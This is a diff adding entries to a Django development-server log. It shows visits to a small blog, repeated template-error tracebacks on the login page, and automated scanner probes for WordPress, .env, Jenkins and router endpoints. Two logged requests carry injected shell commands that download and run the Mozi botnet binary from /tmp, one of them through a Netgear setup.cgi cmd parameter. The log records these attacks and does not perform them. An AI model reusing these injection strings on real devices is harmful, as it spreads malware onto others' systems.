@@ -5189,3 +5189,2776 @@ Watching for file changes with StatReloader
 [17/Jan/2021 06:34:37] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
 [17/Jan/2021 06:34:39] "GET /admin/accounts/account/3/change/ HTTP/1.1" 200 20265
 [17/Jan/2021 06:34:39] "GET /admin/jsi18n/ HTTP/1.1" 200 8314
+[17/Jan/2021 06:37:01] "GET / HTTP/1.1" 200 1640
+[17/Jan/2021 06:37:02] "GET /auth/logout HTTP/1.1" 302 0
+[17/Jan/2021 06:37:02] "GET /auth/login HTTP/1.1" 200 2090
+[17/Jan/2021 06:37:03] "GET /auth/login HTTP/1.1" 200 2090
+[17/Jan/2021 06:37:05] "POST /auth/login HTTP/1.1" 200 1752
+[17/Jan/2021 06:37:07] "GET /auth/logout HTTP/1.1" 302 0
+[17/Jan/2021 06:37:07] "GET /auth/login HTTP/1.1" 200 2090
+[17/Jan/2021 06:37:08] "GET /auth/signup HTTP/1.1" 200 2689
+[17/Jan/2021 06:37:10] "GET /auth/login HTTP/1.1" 200 2090
+[17/Jan/2021 06:43:22] "GET / HTTP/1.1" 200 1749
+Not Found: /wp-includes/js/jquery/jquery.js
+[17/Jan/2021 06:43:22] "GET /wp-includes/js/jquery/jquery.js HTTP/1.1" 404 2304
+Not Found: /administrator/help/en-GB/toc.json
+[17/Jan/2021 06:43:23] "GET /administrator/help/en-GB/toc.json HTTP/1.1" 404 2310
+Not Found: /administrator/language/en-GB/install.xml
+[17/Jan/2021 06:43:24] "GET /administrator/language/en-GB/install.xml HTTP/1.1" 404 2331
+Not Found: /plugins/system/debug/debug.xml
+[17/Jan/2021 06:43:24] "GET /plugins/system/debug/debug.xml HTTP/1.1" 404 2301
+Not Found: /administrator/
+[17/Jan/2021 06:43:25] "GET /administrator/ HTTP/1.1" 404 2253
+Not Found: /misc/ajax.js
+[17/Jan/2021 06:43:26] "GET /misc/ajax.js HTTP/1.1" 404 2247
+[17/Jan/2021 06:43:26] "GET / HTTP/1.1" 200 1749
+Not Found: /admin/view/javascript/common.js
+[17/Jan/2021 06:43:27] "GET /admin/view/javascript/common.js HTTP/1.1" 404 4052
+Not Found: /admin/includes/general.js
+[17/Jan/2021 06:43:27] "GET /admin/includes/general.js HTTP/1.1" 404 4034
+Not Found: /images/editor/separator.gif
+[17/Jan/2021 06:43:28] "GET /images/editor/separator.gif HTTP/1.1" 404 2292
+Not Found: /js/header-rollup-554.js
+[17/Jan/2021 06:43:29] "GET /js/header-rollup-554.js HTTP/1.1" 404 2280
+Not Found: /vendor/phpunit/phpunit/build.xml
+[17/Jan/2021 06:43:29] "GET /vendor/phpunit/phpunit/build.xml HTTP/1.1" 404 2307
+Not Found: /fckeditor/editor/filemanager/connectors/php/upload.php
+[17/Jan/2021 06:43:30] "GET /fckeditor/editor/filemanager/connectors/php/upload.php?Type=Media HTTP/1.1" 404 2384
+Not Found: /.env
+[17/Jan/2021 06:43:31] "GET /.env HTTP/1.1" 404 2223
+[17/Jan/2021 06:43:31] "GET / HTTP/1.1" 200 1749
+Not Found: /wp-admin/setup-config.php
+[17/Jan/2021 06:43:32] "GET /wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2293
+Not Found: /wordpress/wp-admin/setup-config.php
+[17/Jan/2021 06:43:32] "GET /wordpress/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2323
+Not Found: /wp/wp-admin/setup-config.php
+[17/Jan/2021 06:43:33] "GET /wp/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2302
+Not Found: /blog/wp-admin/setup-config.php
+[17/Jan/2021 06:43:34] "GET /blog/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /test/wp-admin/setup-config.php
+[17/Jan/2021 06:43:34] "GET /test/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /site/wp-admin/setup-config.php
+[17/Jan/2021 06:43:35] "GET /site/wp-admin/setup-config.php?step=0 HTTP/1.1" 404 2308
+Not Found: /GponForm/diag_Form
+[17/Jan/2021 06:52:22] "POST /GponForm/diag_Form?images/ HTTP/1.1" 404 2273
+----------------------------------------
+Exception happened during processing of request from ('178.72.71.97', 1855)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+Not Found: /login
+[17/Jan/2021 07:06:43] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[17/Jan/2021 07:06:43] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[17/Jan/2021 07:06:43] "GET /manager/html HTTP/1.0" 404 2247
+[17/Jan/2021 07:11:39] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 07:11:40] "GET /static/css/blog_font.css HTTP/1.1" 200 433
+[17/Jan/2021 07:11:40] "GET /static/css/blog_base_total.css HTTP/1.1" 200 70
+[17/Jan/2021 07:11:40] "GET /static/css/blog_base_nav.css HTTP/1.1" 200 748
+[17/Jan/2021 07:11:40] "GET /static/css/blog_base_header.css HTTP/1.1" 200 1055
+[17/Jan/2021 07:11:44] "GET /auth/login HTTP/1.1" 200 2090
+Not Found: /manager/html/
+[17/Jan/2021 07:50:55] "GET /manager/html/ HTTP/1.0" 404 2250
+[17/Jan/2021 08:08:47] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 08:09:05] "GET / HTTP/1.0" 200 1749
+Not Found: /portal/redlion
+[17/Jan/2021 08:10:55] "GET /portal/redlion HTTP/1.1" 404 2254
+Not Found: /login
+[17/Jan/2021 08:42:48] "GET /login HTTP/1.0" 404 2226
+Not Found: /jenkins/login
+[17/Jan/2021 08:42:48] "GET /jenkins/login HTTP/1.0" 404 2250
+Not Found: /manager/html
+[17/Jan/2021 08:42:48] "GET /manager/html HTTP/1.0" 404 2247
+[17/Jan/2021 08:46:18] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 08:49:39] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 08:55:44] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 08:55:55] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 09:25:04] "GET / HTTP/1.1" 200 1749
+Not Found: /.env
+[17/Jan/2021 09:32:09] "GET /.env HTTP/1.1" 404 2224
+Forbidden (CSRF cookie not set.): /
+[17/Jan/2021 09:32:10] "POST / HTTP/1.1" 403 2994
+[17/Jan/2021 09:41:23] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 09:46:19] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 09:58:13] "GET / HTTP/1.1" 200 1749
+Not Found: /ads.txt
+[17/Jan/2021 09:58:14] "GET /ads.txt HTTP/1.1" 404 2232
+[17/Jan/2021 10:21:14] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+[17/Jan/2021 10:21:14] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" 400 -
+Not Found: /HNAP1/
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 138, in run
+    self.finish_response()
+  File "/usr/lib/python3.6/wsgiref/handlers.py", line 183, in finish_response
+    self.close()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 113, in close
+    self.get_stdin()._read_limited()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/wsgi.py", line 28, in _read_limited
+    result = self.stream.read(size)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+Not Found: /config/getuser
+[17/Jan/2021 10:42:59] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+Not Found: /config/getuser
+[17/Jan/2021 11:26:04] "GET /config/getuser?index=0 HTTP/1.1" 404 2265
+[17/Jan/2021 11:27:24] "HEAD / HTTP/1.0" 200 1749
+[17/Jan/2021 11:31:54] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 11:35:08] "GET / HTTP/1.1" 200 1749
+Not Found: /actuator/health
+[17/Jan/2021 11:39:41] "GET /actuator/health HTTP/1.1" 404 2257
+[17/Jan/2021 12:07:32] "GET / HTTP/1.0" 200 1749
+[17/Jan/2021 12:26:21] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 13:26:06] "GET / HTTP/1.0" 200 1749
+[17/Jan/2021 13:47:04] "GET / HTTP/1.1" 200 1749
+Not Found: /wp-admin/setup-config.php
+[17/Jan/2021 13:47:10] "GET /wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2312
+Not Found: /wp-admin/install.php
+[17/Jan/2021 13:47:19] "GET /wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2297
+[17/Jan/2021 13:51:31] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 13:51:31] "GET /static/css/blog_font.css HTTP/1.1" 304 0
+[17/Jan/2021 13:51:31] "GET /static/css/blog_base_total.css HTTP/1.1" 304 0
+[17/Jan/2021 13:51:31] "GET /static/css/blog_base_header.css HTTP/1.1" 304 0
+[17/Jan/2021 13:51:31] "GET /static/css/blog_base_nav.css HTTP/1.1" 304 0
+[17/Jan/2021 13:51:34] "GET /auth/login HTTP/1.1" 200 2090
+[17/Jan/2021 13:51:36] "GET /auth/signup HTTP/1.1" 200 2689
+[17/Jan/2021 13:51:38] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 13:55:48] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 14:05:16] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 14:12:09] "HEAD / HTTP/1.0" 200 1749
+[17/Jan/2021 14:21:36] "GET / HTTP/1.1" 200 1749
+Not Found: /wp/wp-admin/setup-config.php
+[17/Jan/2021 14:21:55] "GET /wp/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2321
+Not Found: /wp/wp-admin/install.php
+[17/Jan/2021 14:22:07] "GET /wp/wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2306
+Not Found: /wordpress/wp-admin/setup-config.php
+[17/Jan/2021 14:22:12] "GET /wordpress/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2342
+Not Found: /wordpress/wp-admin/install.php
+[17/Jan/2021 14:22:15] "GET /wordpress/wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2327
+Not Found: /blog/wp-admin/setup-config.php
+[17/Jan/2021 14:22:26] "GET /blog/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2327
+Not Found: /blog/wp-admin/install.php
+[17/Jan/2021 14:22:31] "GET /blog/wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2312
+Not Found: /new/wp-admin/setup-config.php
+[17/Jan/2021 14:22:33] "GET /new/wp-admin/setup-config.php?step=1&language=en_GB HTTP/1.1" 404 2324
+Not Found: /new/wp-admin/install.php
+[17/Jan/2021 14:23:02] "GET /new/wp-admin/install.php?step=1&language=en_GB HTTP/1.1" 404 2309
+[17/Jan/2021 14:40:54] "GET / HTTP/1.1" 200 1749
+Not Found: /setup.cgi
+[17/Jan/2021 15:09:27] "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0" 404 2400
+Not Found: /http:/www.baidu.com/cache/global/img/gs.gif
+[17/Jan/2021 15:12:27] "GET http://www.baidu.com/cache/global/img/gs.gif HTTP/1.1" 404 1742
+----------------------------------------
+Exception happened during processing of request from ('80.82.70.187', 52308)
+Traceback (most recent call last):
+  File "/usr/lib/python3.6/socketserver.py", line 654, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.6/socketserver.py", line 364, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.6/socketserver.py", line 724, in __init__
+    self.handle()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 174, in handle
+    self.handle_one_request()
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/servers/basehttp.py", line 182, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.6/socket.py", line 586, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[17/Jan/2021 15:15:42] "HEAD / HTTP/1.1" 200 1749
+[17/Jan/2021 15:36:43] "GET / HTTP/1.1" 200 1749
+[17/Jan/2021 15:40:04] "HEAD / HTTP/1.0" 200 1752
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 6: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 15:45:32] "GET /auth/login HTTP/1.1" 500 146997
+Not Found: /favicon.ico
+[17/Jan/2021 15:45:32] "GET /favicon.ico HTTP/1.1" 404 2244
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 6: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 15:45:55] "GET /auth/login HTTP/1.1" 500 147140
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 6: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 15:46:26] "GET /auth/login HTTP/1.1" 500 147140
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 15:47:30] "GET /auth/login HTTP/1.1" 500 147159
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
+    return parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 270, in do_extends
+    nodelist = parser.parse()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 478, in parse
+    raise self.error(token, e)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 476, in parse
+    compiled_result = compile_func(self, token)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader_tags.py", line 213, in do_block
+    nodelist = parser.parse(('endblock',))
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 472, in parse
+    self.invalid_block_tag(token, command, parse_until)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 528, in invalid_block_tag
+    get_text_list(["'%s'" % p for p in parse_until], 'or'),
+django.template.exceptions.TemplateSyntaxError: Invalid block tag on line 7: 'static', expected 'endblock'. Did you forget to register or load this tag?
+[17/Jan/2021 15:47:32] "GET /auth/login HTTP/1.1" 500 147159
+Internal Server Error: /auth/login
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 470, in parse
+    compile_func = self.tags[command]
+KeyError: 'static'
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/exception.py", line 47, in inner
+    response = get_response(request)
+  File "/root/myvenv/lib/python3.6/site-packages/django/core/handlers/base.py", line 179, in _get_response
+    response = wrapped_callback(request, *callback_args, **callback_kwargs)
+  File "/root/accounts/views.py", line 16, in login_view
+    return render(request,"accounts/login.html")
+  File "/root/myvenv/lib/python3.6/site-packages/django/shortcuts.py", line 19, in render
+    content = loader.render_to_string(template_name, context, request, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 61, in render_to_string
+    template = get_template(template_name, using=using)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loader.py", line 15, in get_template
+    return engine.get_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/backends/django.py", line 34, in get_template
+    return Template(self.engine.get_template(template_name), self)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 143, in get_template
+    template, origin = self.find_template(template_name)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/engine.py", line 125, in find_template
+    template = loader.get_template(name, skip=skip)
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/loaders/base.py", line 30, in get_template
+    contents, origin, origin.template_name, self.engine,
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 155, in __init__
+    self.nodelist = self.compile_nodelist()
+  File "/root/myvenv/lib/python3.6/site-packages/django/template/base.py", line 193, in compile_nodelist
